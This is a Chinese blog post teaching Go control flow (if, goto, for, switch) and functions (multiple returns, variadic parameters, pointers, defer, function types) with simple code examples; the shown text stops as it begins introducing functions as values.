    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/15/2.%E6%B5%81%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">2.流程和函数</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-15 18:27:20 / 修改时间：19:00:17" itemprop="dateCreated datePublished" datetime="2022-09-15T18:27:20+08:00">2022-09-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><p>流程控制在编程语言中是最伟大的发明了，因为有了它，你可以通过很简单的流程描述来表达很复杂的逻辑。Go 中流程控制分三大类：条件判断，循环控制和无条件跳转。</p>
<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p><code>if</code> 也许是各种编程语言中最常见的了，它的语法概括起来就是：如果满足条件就做某事，否则做另一件事。</p>
<p>Go 里面 <code>if</code> 条件判断语句中不需要括号，如下代码所示</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">10</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;x is greater than 10&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;x is less than 10&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多个条件的时候如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> integer == <span class="number">3</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The integer is equal to 3&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> integer &lt; <span class="number">3</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The integer is less than 3&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The integer is greater than 3&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h2><p>Go 有 <code>goto</code> 语句 —— 请明智地使用它。用 <code>goto</code> 跳转到必须在当前函数内定义的标签。例如假设这样一个循环：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func myFunc() &#123;</span><br><span class="line">    i := 0</span><br><span class="line">Here:   // 这行的第一个词，以冒号结束作为标签</span><br><span class="line">    println(i)</span><br><span class="line">    i++</span><br><span class="line">    goto Here   // 跳转到 Here 去</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><p>Go 里面最强大的一个控制逻辑就是 <code>for</code>，它既可以用来循环读取数据，又可以当作 <code>while</code> 来控制逻辑，还能迭代操作。它的语法如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> expression1; expression2; expression3 &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>expression1、expression2 和 expression3 都是表达式，其中 expression1 和 expression3 是变量声明或者函数调用返回值之类的，expression2 是用来条件判断，expression1 在循环开始之前调用，expression3 在每轮循环结束之时调用。</p>
<p>一个例子比上面讲那么多更有用，那么我们看看下面的例子吧：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum := <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> index:=<span class="number">0</span>; index &lt; <span class="number">10</span> ; index++ &#123;</span><br><span class="line">        sum += index</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;sum is equal to &quot;</span>, sum)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出：sum is equal to 45</span></span><br></pre></td></tr></table></figure>

<p>有些时候需要进行多个赋值操作，由于 Go 里面没有 <code>,</code> 操作符，那么可以使用平行赋值 <code>i, j = i+1, j-1</code></p>
<p>有些时候如果我们忽略 <code>expression1</code> 和 <code>expression3</code>：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sum := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> ; sum &lt; <span class="number">1000</span>;  &#123;</span><br><span class="line">    sum += sum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>;</code> 也可以省略，那么就变成如下的代码了，是不是似曾相识？对，这就是 <code>while</code> 的功能。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sum := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> sum &lt; <span class="number">1000</span> &#123;</span><br><span class="line">    sum += sum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在循环里面有两个关键操作 break 和 continue, break 操作是跳出当前循环，continue 是跳过本次循环。当嵌套过深的时候， break 可以配合标签使用，即跳转至标签所指定的位置，详细参考如下例子：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> index := <span class="number">10</span>; index&gt;<span class="number">0</span>; index-- &#123;</span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">5</span>&#123;</span><br><span class="line">        <span class="keyword">break</span> <span class="comment">// 或者continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(index)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// break打印出来10、9、8、7、6</span></span><br><span class="line"><span class="comment">// continue打印出来10、9、8、7、6、4、3、2、1</span></span><br></pre></td></tr></table></figure>

<p><code>break</code> 和 <code>continue</code> 还可以跟着标号，用来跳到多重循环中的外层循环</p>
<p><code>for</code> 配合 <code>range</code> 可以用于读取 <code>slice</code> 和 <code>map</code> 的数据：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v:=<span class="keyword">range</span> <span class="keyword">map</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;map&#x27;s key:&quot;</span>,k)</span><br><span class="line">    fmt.Println(<span class="string">&quot;map&#x27;s val:&quot;</span>,v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 Go 支持 “多值返回”, 而对于 “声明而未被调用” 的变量，编译器会报错，在这种情况下，可以使用 <code>_</code> 来丢弃不需要的返回值<br>例如</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> <span class="keyword">map</span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;map&#x27;s val:&quot;</span>, v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p>些时候你需要写很多的 <code>if-else</code> 来实现一些逻辑处理，这个时候代码看上去就很丑很冗长，而且也不易于以后的维护，这个时候 <code>switch</code> 就能很好的解决这个问题。它的语法如下</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">switch</span> sExpr &#123;</span><br><span class="line"><span class="keyword">case</span> expr1:</span><br><span class="line">    some instructions</span><br><span class="line"><span class="keyword">case</span> expr2:</span><br><span class="line">    some other instructions</span><br><span class="line"><span class="keyword">case</span> expr3:</span><br><span class="line">    some other instructions</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    other code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i := <span class="number">10</span></span><br><span class="line"><span class="keyword">switch</span> i &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;i is equal to 1&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;i is equal to 2, 3 or 4&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;i is equal to 10&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;All I know is that i is an integer&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在第 5 行中，我们把很多值聚合在了一个 case 里面，同时，Go 里面 switch 默认相当于每个 case 最后带有 break，匹配成功后不会自动向下执行其他 case，而是跳出整个 switch, 但是可以使用 fallthrough 强制执行后面的 case 代码。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">integer := <span class="number">6</span></span><br><span class="line"><span class="keyword">switch</span> integer &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;The integer was &lt;= 4&quot;</span>)</span><br><span class="line">    <span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;The integer was &lt;= 5&quot;</span>)</span><br><span class="line">    <span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;The integer was &lt;= 6&quot;</span>)</span><br><span class="line">    <span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;The integer was &lt;= 7&quot;</span>)</span><br><span class="line">    <span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;The integer was &lt;= 8&quot;</span>)</span><br><span class="line">    <span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;default case&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的程序将输出</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The integer was &lt;= <span class="number">6</span></span><br><span class="line">The integer was &lt;= <span class="number">7</span></span><br><span class="line">The integer was &lt;= <span class="number">8</span></span><br><span class="line"><span class="keyword">default</span> <span class="keyword">case</span></span><br></pre></td></tr></table></figure>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>函数是 Go 里面的核心设计，它通过关键字 <code>func</code> 来声明，它的格式如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">funcName</span><span class="params">(input1 type1, input2 type2)</span></span> (output1 type1, output2 type2) &#123;</span><br><span class="line">    <span class="comment">// 这里是处理逻辑代码</span></span><br><span class="line">    <span class="comment">// 返回多个值</span></span><br><span class="line">    <span class="keyword">return</span> value1, value2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码我们看出</p>
<p>关键字 func 用来声明一个函数 funcName<br>函数可以有一个或者多个参数，每个参数后面带有类型，通过 , 分隔<br>函数可以返回多个值<br>上面返回值声明了两个变量 output1 和 output2，如果你不想声明也可以，直接就两个类型<br>如果只有一个返回值且不声明返回值变量，那么你可以省略 包括返回值 的括号<br>如果没有返回值，那么就直接省略最后的返回信息<br>如果有返回值， 那么必须在函数的外层添加 return 语句</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回 a、b 中最大值.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="number">3</span></span><br><span class="line">    y := <span class="number">4</span></span><br><span class="line">    z := <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    max_xy := max(x, y) <span class="comment">// 调用函数max(x, y)</span></span><br><span class="line">    max_xz := max(x, z) <span class="comment">// 调用函数max(x, z)</span></span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;max(%d, %d) = %d\n&quot;</span>, x, y, max_xy)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;max(%d, %d) = %d\n&quot;</span>, x, z, max_xz)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;max(%d, %d) = %d\n&quot;</span>, y, z, max(y,z)) <span class="comment">// 也可在这直接调用它</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这个里面我们可以看到 max 函数有两个参数，它们的类型都是 int，那么第一个变量的类型可以省略（即 a, b int, 而非 a int, b int)，默认为离它最近的类型，同理多于 2 个同类型的变量或者返回值。同时我们注意到它的返回值就是一个类型，这个就是省略写法。</p>
<h2 id="多个返回值"><a href="#多个返回值" class="headerlink" title="多个返回值"></a>多个返回值</h2><p>Go 语言比 C 更先进的特性，其中一点就是函数能够返回多个值。</p>
<p>我们直接上代码看例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回 A+B 和 A*B</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SumAndProduct</span><span class="params">(A, B <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> A+B, A*B</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="number">3</span></span><br><span class="line">    y := <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    xPLUSy, xTIMESy := SumAndProduct(x, y)</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d + %d = %d\n&quot;</span>, x, y, xPLUSy)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d * %d = %d\n&quot;</span>, x, y, xTIMESy)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="变参"><a href="#变参" class="headerlink" title="变参"></a>变参</h2><p>Go 函数支持变参。接受变参的函数是有着不定数量的参数的。为了做到这点，首先需要定义函数使其接受变参：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunc</span><span class="params">(arg ...<span class="type">int</span>)</span></span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p><code>arg ...int</code> 告诉 Go 这个函数接受不定数量的参数。注意，这些参数的类型全部是 <code>int</code>。在函数体中，变量 <code>arg</code> 是一个 <code>int</code> 的 <code>slice</code>：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, n := <span class="keyword">range</span> arg &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;And the number is: %d\n&quot;</span>, n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="传值与传指针"><a href="#传值与传指针" class="headerlink" title="传值与传指针"></a>传值与传指针</h2><p>当我们传一个参数值到被调用函数里面时，实际上是传了这个值的一份 copy，当在被调用函数中修改参数值的时候，调用函数中相应实参不会发生任何变化，因为数值变化只作用在 copy 上。</p>
<p>为了验证我们上面的说法，我们来看一个例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单的一个函数，实现了参数+1的操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add1</span><span class="params">(a <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    a = a+<span class="number">1</span> <span class="comment">// 我们改变了 a 的值</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="comment">// 返回一个新值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;x = &quot;</span>, x)  <span class="comment">// 应该输出 &quot;x = 3&quot;</span></span><br><span class="line"></span><br><span class="line">    x1 := add1(x)  <span class="comment">// 调用 add1(x)</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;x+1 = &quot;</span>, x1) <span class="comment">// 应该输出 &quot;x+1 = 4&quot;</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;x = &quot;</span>, x)    <span class="comment">// 应该输出 &quot;x = 3&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到了吗？虽然我们调用了 add1 函数，并且在 add1 中执行 a &#x3D; a+1 操作，但是上面例子中 x 变量的值没有发生变化</p>
<p>理由很简单：因为当我们调用 add1 的时候，add1 接收的参数其实是 x 的 copy，而不是 x 本身。</p>
<p>那你也许会问了，如果真的需要传这个 x 本身，该怎么办呢？</p>
<p>这就牵扯到了所谓的指针。我们知道，变量在内存中是存放于一定地址上的，修改变量实际是修改变量地址处的内存。只有 add1 函数知道 x 变量所在的地址，才能修改 x 变量的值。所以我们需要将 x 所在地址 &amp;x 传入函数，并将函数的参数的类型由 int 改为 *int，即改为指针类型，才能在函数中修改 x 变量的值。此时参数仍然是按 copy 传递的，只是 copy 的是一个指针。请看下面的例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单的一个函数，实现了参数+1的操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add1</span><span class="params">(a *<span class="type">int</span>)</span></span> <span class="type">int</span> &#123; <span class="comment">// 请注意，</span></span><br><span class="line">    *a = *a+<span class="number">1</span> <span class="comment">// 修改了a的值</span></span><br><span class="line">    <span class="keyword">return</span> *a <span class="comment">// 返回新值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;x = &quot;</span>, x)  <span class="comment">// 应该输出 &quot;x = 3&quot;</span></span><br><span class="line"></span><br><span class="line">    x1 := add1(&amp;x)  <span class="comment">// 调用 add1(&amp;x) 传x的地址</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;x+1 = &quot;</span>, x1) <span class="comment">// 应该输出 &quot;x+1 = 4&quot;</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;x = &quot;</span>, x)    <span class="comment">// 应该输出 &quot;x = 4&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，我们就达到了修改 x 的目的。那么到底传指针有什么好处呢？</p>
<p>传指针使得多个函数能操作同一个对象。<br>传指针比较轻量级 (8bytes)，只是传内存地址，我们可以用指针传递体积大的结构体。如果用参数值传递的话，在每次 copy 上面就会花费相对较多的系统开销（内存和时间）。所以当你要传递大的结构体的时候，用指针是一个明智的选择。<br>Go 语言中 channel ，slice ， map 这三种类型的实现机制类似指针，所以可以直接传递，而不用取地址后传递指针。（注：若函数需改变 slice 的长度，则仍需要取地址传递指针）</p>
<h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><p>Go 语言中有种不错的设计，即延迟（defer）语句，你可以在函数中添加多个 defer 语句。当函数执行到最后时，这些 defer 语句会按照逆序执行，最后该函数返回。特别是当你在进行一些打开资源的操作时，遇到错误需要提前返回，在返回前你需要关闭相应的资源，不然很容易造成资源泄露等问题。如下代码所示，我们一般写打开一个资源是这样操作的：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadWrite</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    file.Open(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="comment">// 做一些工作</span></span><br><span class="line">    <span class="keyword">if</span> failureX &#123;</span><br><span class="line">        file.Close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> failureY &#123;</span><br><span class="line">        file.Close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.Close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到上面有很多重复的代码，Go 的 <code>defer</code> 有效解决了这个问题。使用它后，不但代码量减少了很多，而且程序变得更优雅。在 <code>defer</code> 后指定的函数会在函数退出前调用。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">    <span class="keyword">defer</span> fmt.Printf(<span class="string">&quot;%d &quot;</span>, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="函数作为值、类型"><a href="#函数作为值、类型" class="headerlink" title="函数作为值、类型"></a>函数作为值、类型</h2><p>在 Go 中函数也是一种变量，我们可以通过 <code>type</code> 来定义它，它的类型就是所有拥有相同的参数，相同的返回值的一种类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> typeName <span class="function"><span class="keyword">func</span><span class="params">(input1 inputType1 , input2 inputType2 [, ...])</span></span> (result1 resultType1 [, ...])</span><br></pre></td></tr></table></figure>

<p>函数作为类型到底有什么好处呢？那就是可以把这个类型的函数当做值来传递，请看下面的例子</p>
